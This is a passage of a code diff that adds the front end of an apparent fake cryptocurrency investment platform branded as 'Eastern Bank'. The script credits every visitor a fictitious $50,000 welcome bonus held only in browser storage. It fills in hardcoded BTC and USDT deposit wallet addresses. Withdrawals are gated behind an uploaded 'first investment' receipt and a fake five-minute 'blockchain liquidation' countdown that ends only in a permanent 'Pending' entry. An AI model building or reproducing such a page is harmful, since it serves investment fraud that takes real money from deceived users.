+<div id="auditPositiveUploadBlock" class="conditional-proof-container" style="display: none;">
+<div class="input-group">
+<label class="input-label" style="color: var(--color-green);">Drop or Upload Proof Screenshot of Your First Made Investment Transfer Receipt</label>
+<input type="file" id="withdrawProofFileSelector" class="proof-file-picker" accept="image/*" onchange="validateWithdrawalButtonState()">
+</div>
+<div class="checkbox-row-alignment">
+<input type="checkbox" id="withdrawCertifyCheck" onchange="validateWithdrawalButtonState()">
+<label for="withdrawCertifyCheck" class="checkbox-label-text">
+I certify that the information provided is fully correct and my uploaded investment screenshot matches active account tracking metrics.
+</label>
+</div>
+</div>
+</div>
+
+<button type="button" id="mainWithdrawActionBtn" class="btn-action-primary" disabled onclick="executeWithdrawalCountdownProcessing()">
+<i class="fa-solid fa-paper-plane"></i> Request Secure Withdrawal
+</button>
+</div>
+</div>
+</div>
+
+<div id="spa-withdrawing-delay-view" class="spa-view-node hidden-spa-node">
+<div class="container" style="margin-top: 60px;">
+<div class="card" style="text-align: center; padding: 45px 16px;">
+<div class="spinner" style="border-top-color: var(--color-pending);"></div>
+<h3 class="page-title" style="color: var(--color-pending);">Processing Blockchain Liquidations</h3>
+<p class="page-subtitle">Verifying security hashes, analyzing uploaded transaction proof receipt metrics, and deploying digital network synchronization keys.</p>
+
+<div class="card" style="background-color: var(--bg-accent); margin: 24px 0 0 0; padding: 16px;">
+<span style="color: var(--color-muted); font-size: 0.8rem; display: block; margin-bottom: 6px; text-transform: uppercase; font-weight: 600; letter-spacing:0.5px;">Remaining Synchronization Hold Time</span>
+<h1 id="countdownTimerLabelDisplay" style="font-size: 2.5rem; font-weight: 700; color: var(--color-white);">05:00</h1>
+</div>
+</div>
+</div>
+</div>
+
+<div class="nav-dock-bar" id="mainNavigationDock">
+<button type="button" id="dock-home-btn" onclick="toggleSpaLayoutView('home')" class="nav-dock-element active-dock">
+<i class="fa-solid fa-house"></i>
+<span>Home</span>
+</button>
+<button type="button" onclick="toggleSpaLayoutView('packages')" class="nav-dock-element">
+<i class="fa-solid fa-circle-arrow-down"></i>
+<span>Deposit</span>
+</button>
+<button type="button" id="dock-packages-btn" onclick="toggleSpaLayoutView('packages')" class="nav-dock-element center-action-node">
+<i class="fa-solid fa-bolt"></i>
+<span>Packages</span>
+</button>
+<button type="button" onclick="toggleSpaLayoutView('home'); window.scrollTo(0, document.body.scrollHeight);" class="nav-dock-element">
+<i class="fa-solid fa-clock-rotate-left"></i>
+<span>History</span>
+</button>
+<button type="button" onclick="toggleSpaLayoutView('home'); document.getElementById('profileTrigger').click();" class="nav-dock-element">
+<i class="fa-solid fa-circle-user"></i>
+<span>Profile</span>
+</button>
+</div>
+
+<script>
+// Cryptographic Wallet Storage Constants Definitions
+const ADDR_BTC_VAL = "bc1qll8lq9w9cjn9vxzslteaaxklrax3q57lalqlkg";
+const ADDR_USDT_VAL = "0x449ac814B54088C48eA6A91Cfa9D97F84C21CCC9";
+let activeCryptoSelection = "BTC";
+let activeWithdrawalRouteSelection = "BTC";
+
+// Click dynamic handler engine setting choices inside memory variables before routing
+function handlePackageSelect(planLabel, defaultMinVal) {
+localStorage.setItem('selectedPlanLabel', planLabel);
+document.getElementById('paymentPlanTitle').innerText = planLabel;
+document.getElementById('customInvestmentAmountInput').value = defaultMinVal;
+
+// Launch 5-second loading loop framework screen sequence
+toggleSpaLayoutView('loader');
+setTimeout(() => {
+toggleSpaLayoutView('payment');
+}, 5000);
+}
+
+// Router routing script framework layout engine configuration switcher
+function toggleSpaLayoutView(targetState) {
+const homePanel = document.getElementById('spa-home-view');
+const packagesPanel = document.getElementById('spa-packages-view');
+const loaderPanel = document.getElementById('spa-loader-view');
+const paymentPanel = document.getElementById('spa-payment-view');
+const withdrawPanel = document.getElementById('spa-withdrawal-view');
+const delayPanel = document.getElementById('spa-withdrawing-delay-view');
+
+const homeDockBtn = document.getElementById('dock-home-btn');
+const packagesDockBtn = document.getElementById('dock-packages-btn');
+
+// Completely drop out and collapse all window frameworks
+homePanel.classList.add('hidden-spa-node');
+packagesPanel.classList.add('hidden-spa-node');
+loaderPanel.classList.add('hidden-spa-node');
+paymentPanel.classList.add('hidden-spa-node');
+withdrawPanel.classList.add('hidden-spa-node');
+delayPanel.classList.add('hidden-spa-node');
+
+homeDockBtn.classList.remove('active-dock');
+packagesDockBtn.classList.remove('center-action-node');
+packagesDockBtn.style.color = "var(--color-muted)";
+
+if(targetState === 'packages') {
+packagesPanel.classList.remove('hidden-spa-node');
+packagesDockBtn.style.color = "var(--color-green)";
+} else if(targetState === 'loader') {
+loaderPanel.classList.remove('hidden-spa-node');
+} else if(targetState === 'payment') {
+paymentPanel.classList.remove('hidden-spa-node');
+} else if(targetState === 'withdrawal') {
+withdrawPanel.classList.remove('hidden-spa-node');
+} else if(targetState === 'delayView') {
+delayPanel.classList.remove('hidden-spa-node');
+} else {
+homePanel.classList.remove('hidden-spa-node');
+homeDockBtn.classList.add('active-dock');
+packagesDockBtn.classList.add('center-action-node');
+packagesDockBtn.removeAttribute('style');
+}
+window.scrollTo(0,0);
+}
+
+// Toggle profile verification ledger menu details drawer open-close action routine 
+const profileTrigger = document.getElementById('profileTrigger');
+const profileDrawer = document.getElementById('profileDrawer');
+profileTrigger.addEventListener('click', () => {
+profileTrigger.classList.toggle('active-trigger');
+profileDrawer.classList.toggle('expanded-drawer');
+});
+
+// Sync data parameters maps blocks on application load instances 
+window.addEventListener('DOMContentLoaded', () => {
+renderCurrentDashboardStateData();
+});
+
+// Layout state builder rendering script logic execution controller 
+function renderCurrentDashboardStateData() {
+const rawFirst = localStorage.getItem('userFirstName') || '';
+const rawMiddle = localStorage.getItem('userMiddleName') || '';
+const rawLast = localStorage.getItem('userLastName') || '';
+const rawEmail = localStorage.getItem('userEmail') || 'notset@easternbank.com';
+const rawPhone = localStorage.getItem('userPhone') || 'Unspecified';
+const rawDOB = localStorage.getItem('userDOB') || 'Not provided';
+const rawAddr = localStorage.getItem('userAddress') || 'No address set';
+const generatedUser = localStorage.getItem('tempUser') || 'eastern_user';
+
+const fullNameStr = (rawFirst + ' ' + rawMiddle + ' ' + rawLast).replace(/\s+/g, ' ').trim();
+const validDisplayName = fullNameStr !== '' ? fullNameStr : 'Valued Client';
+
+document.getElementById('dynamicProfileName').innerText = validDisplayName;
+document.getElementById('dynamicAvatar').innerText = validDisplayName.charAt(0);
+document.getElementById('metaFullName').innerText = validDisplayName;
+document.getElementById('metaUsername').innerText = '@' + generatedUser;
+document.getElementById('metaEmail').innerText = rawEmail;
+document.getElementById('metaPhone').innerText = rawPhone;
+document.getElementById('metaDOB').innerText = rawDOB;
+document.getElementById('metaAddress').innerText = rawAddr;
+
+document.getElementById('ref-link-field').value = "https://easternbank.usa.capital/ref/" + generatedUser;
+
+// Dynamic check calculations parameters to handle subtracted outputs perfectly
+let userBaseBalance = parseFloat(localStorage.getItem('userTotalPortfolioBalance'));
+if (isNaN(userBaseBalance)) {
+userBaseBalance = 50000.00;
+localStorage.setItem('userTotalPortfolioBalance', userBaseBalance);
+}
+
+let trackingWithdrawalsSum = parseFloat(localStorage.getItem('userAggregatedWithdrawalsMetric'));
+if (isNaN(trackingWithdrawalsSum)) {
+trackingWithdrawalsSum = 0.00;
+localStorage.setItem('userAggregatedWithdrawalsMetric', trackingWithdrawalsSum);
+}
+
+document.getElementById('liveBalanceField').innerText = "$" + userBaseBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+document.getElementById('liveDepositStat').innerText = "$50,000.00";
+document.getElementById('liveWithdrawStat').innerText = "$" + trackingWithdrawalsSum.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+const now = new Date();
+const displayStamp = now.toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' }) + ' ' +
+now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+document.getElementById('liveTimestampText').innerText = "Last updated: " + displayStamp;
+
+// Clear and render active recent data arrays items blocks logs listings
+const container = document.getElementById('dynamicTxHistoryContainer');
+container.innerHTML = '';
+
+// A. Core Dynamic Withdrawal Log Arrays Hooks Render Layout
+const savedWithdrawalsRaw = localStorage.getItem('userPlatformWithdrawalsRecord');
+if (savedWithdrawalsRaw) {
+const outfluxList = JSON.parse(savedWithdrawalsRaw);
+outfluxList.forEach(tx => {
+const txHtml = `
+<div class="tx-feed-item">
+<div>
+<div class="tx-title-txt" style="color: var(--color-danger); text-decoration: line-through;">-$${parseFloat(tx.amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}</div>
+<div class="tx-meta-txt">Payout Target: ${tx.route} Asset</div>
+<div class="tx-meta-txt">${tx.timestamp}</div>
+</div>
+<div>
+<span class="tx-status-indicator pending">Pending</span>
+</div>
+</div>
+`;
+container.insertAdjacentHTML('beforeend', txHtml);
+});
+}
+
+// B. Core Dynamic Users Deposits Submissions Arrays Render Hook Logs
+const savedDepositsRaw = localStorage.getItem('userPlatformDepositsRecord');
+if (savedDepositsRaw) {
+const transactionList = JSON.parse(savedDepositsRaw);
+transactionList.forEach(tx => {
+const txHtml = `
+<div class="tx-feed-item">
+<div>
+<div class="tx-title-txt" style="color: var(--color-pending);">+$${parseFloat(tx.amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}</div>
+<div class="tx-meta-txt">Package Asset: ${tx.plan}</div>
+<div class="tx-meta-txt">${tx.timestamp}</div>
+</div>
+<div>
+<span class="tx-status-indicator pending">Pending</span>
+</div>
+</div>
+`;
+container.insertAdjacentHTML('beforeend', txHtml);
+});
+}
+
+// C. Clear out hardcoded $1000 items line and pin the mandatory $50,000 Welcome Bonus transaction history entry
+const welcomeBonusHtml = `
+<div class="tx-feed-item">
+<div>
+<div class="tx-title-txt" style="color: var(--color-green);">+$50,000.00</div>
+<div class="tx-meta-txt">Payment Method: Registration Welcome Bonus</div>
+<div class="tx-meta-txt">${displayStamp}</div>
+</div>
+<div>
+<span class="tx-status-indicator processed">Completed</span>
+</div>
+</div>
+`;
+container.insertAdjacentHTML('beforeend', welcomeBonusHtml);
+}
+
+// Toggle cryptocurrency routing address field parameters setup buttons script logic
+function switchCryptoNetwork(typeKey) {
+activeCryptoSelection = typeKey;
+const btcBtn = document.getElementById('methodBtcBtn');
+const usdtBtn = document.getElementById('methodUsdtBtn');
+const textAddressInput = document.getElementById('targetWalletStringInput');
+
+if (typeKey === 'BTC') {
+btcBtn.classList.add('selected-gateway');
+usdtBtn.classList.remove('selected-gateway');
+textAddressInput.value = ADDR_BTC_VAL;
+} else {
+usdtBtn.classList.add('selected-gateway');
+btcBtn.classList.remove('selected-gateway');
+textAddressInput.value = ADDR_USDT_VAL;
+}
+}
+
+// Toggle Withdrawal Options Routes
+function switchWithdrawRoute(typeKey) {
+activeWithdrawalRouteSelection = typeKey;
+const btcBtn = document.getElementById('withdrawBtcBtn');
+const usdtBtn = document.getElementById('withdrawUsdtBtn');
+if(typeKey === 'BTC') {
+btcBtn.classList.add('selected-gateway');
+usdtBtn.classList.remove('selected-gateway');
+} else {
+usdtBtn.classList.add('selected-gateway');
+btcBtn.classList.remove('selected-gateway');
+}
+}
+
+// Interrogation logic processing handlers for audit questions
+function handleInvestmentAuditTrigger(selectionKey) {
+const warningPanel = document.getElementById('auditNegativeWarningBlock');
+const uploadPanel = document.getElementById('auditPositiveUploadBlock');
+
+if (selectionKey === 'no') {
+warningPanel.style.display = 'block';
+uploadPanel.style.display = 'none';
+} else {
+warningPanel.style.display = 'none';
+uploadPanel.style.display = 'block';
+}
+validateWithdrawalButtonState();
+}
+
+// Check real-time values parameters to confirm whether primary payout button triggers can lock/unlock itself
+function validateWithdrawalButtonState() {
+const yesRadio = document.querySelector('input[name="investmentAuditFlag"][value="yes"]');
+const fileInput = document.getElementById('withdrawProofFileSelector');
+const checkbox = document.getElementById('withdrawCertifyCheck');
+const submitBtn = document.getElementById('mainWithdrawActionBtn');
+
+if (yesRadio.checked && fileInput.files.length > 0 && checkbox.checked) {
+submitBtn.disabled = false;
+} else {
+submitBtn.disabled = true;
+}
+}
+
+// 5 Minutes Active Countdown Delay Routing Processor Loops
+function executeWithdrawalCountdownProcessing() {
+const addressVal = document.getElementById('withdrawAddressInput').value.trim();
+const amountVal = parseFloat(document.getElementById('withdrawAmountFieldInput').value);
+const storedBalance = parseFloat(localStorage.getItem('userTotalPortfolioBalance')) || 50000.00;
+
+if (!addressVal) {
+alert("Please provide your recipient destination network payout address.");
+return;
+}
+if (isNaN(amountVal) || amountVal <= 0) {
+alert("Please type in a valid capital payout figure amount parameter.");
+return;
+}
+if (amountVal > storedBalance) {
+alert("Insufficient liquidity profiles. The entered withdrawal amount threshold overrides your overall account balance portfolio metrics.");
+return;
+}
+
+// Transition view structure directly into hold timer block view
+toggleSpaLayoutView('delayView');
+
+let totalHoldSeconds = 5 * 60; // 5 Minutes in complete seconds count variables
+const labelDisplay = document.getElementById('countdownTimerLabelDisplay');
+
+const countdownIntervalEngine = setInterval(() => {
+totalHoldSeconds--;
+let minutes = Math.floor(totalHoldSeconds / 60);
+let seconds = totalHoldSeconds % 60;
+
+// Format numbers nicely to keep strings always uniform
+let mStr = minutes < 10 ? '0' + minutes : minutes;
+let sStr = seconds < 10 ? '0' + seconds : seconds;
+labelDisplay.innerText = mStr + ':' + sStr;
+
+if (totalHoldSeconds <= 0) {
+clearInterval(countdownIntervalEngine);
+
+// Final balance subtraction processing calculations parameters mappings 
+const alteredBalance = storedBalance - amountVal;
+let aggregatedWithdrawals = parseFloat(localStorage.getItem('userAggregatedWithdrawalsMetric')) || 0.00;
+aggregatedWithdrawals += amountVal;
+
+localStorage.setItem('userTotalPortfolioBalance', alteredBalance);
+localStorage.setItem('userAggregatedWithdrawalsMetric', aggregatedWithdrawals);
+
+// Build history date tokens
+const dateInstance = new Date();
+const customDateStamp = dateInstance.toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' }) + ' ' +
+dateInstance.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+
+let historyOutflows = [];
+const currentOutflowsRaw = localStorage.getItem('userPlatformWithdrawalsRecord');
+if(currentOutflowsRaw) {
+historyOutflows = JSON.parse(currentOutflowsRaw);
+}
+
+// Queue new item right to the very top stack line parameters list
+historyOutflows.unshift({
+amount: amountVal,
+route: activeWithdrawalRouteSelection + " (" + addressVal.substring(0,6) + "..." + addressVal.slice(-4) + ")",
+timestamp: customDateStamp
+});
+
+localStorage.setItem('userPlatformWithdrawalsRecord', JSON.stringify(historyOutflows));
+
+alert("Withdrawal protocol verification complete! Your payout request is logged and is currently Pending allocation.");
+
+// Reset form fields parameters data objects elements paths configuration logs
+document.getElementById('withdrawAddressInput').value = '';
+document.getElementById('withdrawAmountFieldInput').value = '';
+document.getElementById('withdrawProofFileSelector').value = '';
+document.getElementById('withdrawCertifyCheck').checked = false;
+document.querySelector('input[name="investmentAuditFlag"]:checked').checked = false;
+document.getElementById('auditPositiveUploadBlock').style.display = 'none';
+document.getElementById('auditNegativeWarningBlock').style.display = 'none';
+
+// Refresh and direct back home securely
+renderCurrentDashboardStateData();
+toggleSpaLayoutView('home');
+}
+}, 1000); // Ticks every single 1 second interval step loop dynamically
+}
+
+// Clipboard copying routine action module script execution loops
+function executeAddressClipboardCopy() {
+const selectorField = document.getElementById('targetWalletStringInput');
+selectorField.select();
+selectorField.setSelectionRange(0, 99999);
+navigator.clipboard.writeText(selectorField.value);
+
+const targetCopyBtn = document.getElementById('copyTextNodeBtn');
+targetCopyBtn.innerText = "Copied!";
+setTimeout(() => { targetCopyBtn.innerText = "Copy"; }, 2000);
+}
+
+// Process data variables confirmation push and return home sequence routing execution
+function commitTransactionLedgerUpdates() {
+const fileDocNode = document.getElementById('proofImageDocument');
+const declarationBoxNode = document.getElementById('certificationFlagCheck');
+const inputAmountField = document.getElementById('customInvestmentAmountInput');
+
+const currentActiveCost = parseFloat(inputAmountField.value);
+
+if (isNaN(currentActiveCost) || currentActiveCost <= 0) {
+alert("Please type in a valid deposit transaction capital amount numerical configuration parameter.");
+return;
+}
+if (!fileDocNode.files.length) {
+alert("Please upload or drop an image document snapshot configuration file of your investment payment receipt.");
+return;
+}
+if (!declarationBoxNode.checked) {
+alert("Please verify the validation selector checkbox indicator declaring successful manual verification payment.");
+return;
+}
+
+const currentActivePlan = localStorage.getItem('selectedPlanLabel') || 'Standard Base Plan';
+
+const calendarInstance = new Date();
+const processedDateStamp = calendarInstance.toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' }) + ' ' +
+calendarInstance.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+
+let historicalTransactionsArray = [];
+const absoluteHistoryRaw = localStorage.getItem('userPlatformDepositsRecord');
+if (absoluteHistoryRaw) {
+historicalTransactionsArray = JSON.parse(absoluteHistoryRaw);
+}
+
+// Insert new investment parameters directly into state stack list 
+historicalTransactionsArray.unshift({
+amount: currentActiveCost,
+plan: currentActivePlan + " via " + activeCryptoSelection,
+timestamp: processedDateStamp
+});
+
+localStorage.setItem('userPlatformDepositsRecord', JSON.stringify(historicalTransactionsArray));
+
+alert("Deposit submitted perfectly! Your transaction record is now Pending approval.");
+
+// Reset selections arrays elements caches values maps lines safely
+localStorage.removeItem('selectedPlanLabel');
+fileDocNode.value = '';
+declarationBoxNode.checked = false;
+
+// Refresh dashboard interfaces variables and send user straight back to home site panels configuration mapping structure
+renderCurrentDashboardStateData();
+toggleSpaLayoutView('home');
+}
+
+// Real-Time Signal Strength Simulation Fluid Loop Logic Layout
+const progressNode = document.getElementById('live-progress-fluid-node');
+const metricDisplayNode = document.getElementById('signal-percentage-display');
+
+function executeLiveSignalUpdateLoop() {
+const dynamicTargetPercentage = Math.floor(Math.random() * 41) + 55;
+if(progressNode) progressNode.style.width = dynamicTargetPercentage + '%';
+if(metricDisplayNode) metricDisplayNode.innerText = dynamicTargetPercentage + '%';
+setTimeout(executeLiveSignalUpdateLoop, Math.floor(Math.random() * 2000) + 1500);
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+if(progressNode) progressNode.style.width = '15%';
+setTimeout(executeLiveSignalUpdateLoop, 800);
+});
+
+// Clipboard referral copy script strings links configuration routines setup execution loops
+function copyReferralLink() {
+const inputField = document.getElementById('ref-link-field');
+inputField.select();
+inputField.setSelectionRange(0, 99999);
+navigator.clipboard.writeText(inputField.value);
+
+const copyBtn = document.querySelector('.btn-copy-link');
+copyBtn.innerText = "Copied!";
+setTimeout(() => { copyBtn.innerText = "Copy"; }, 2000);
+}
+</script>
+</body>
+</html>
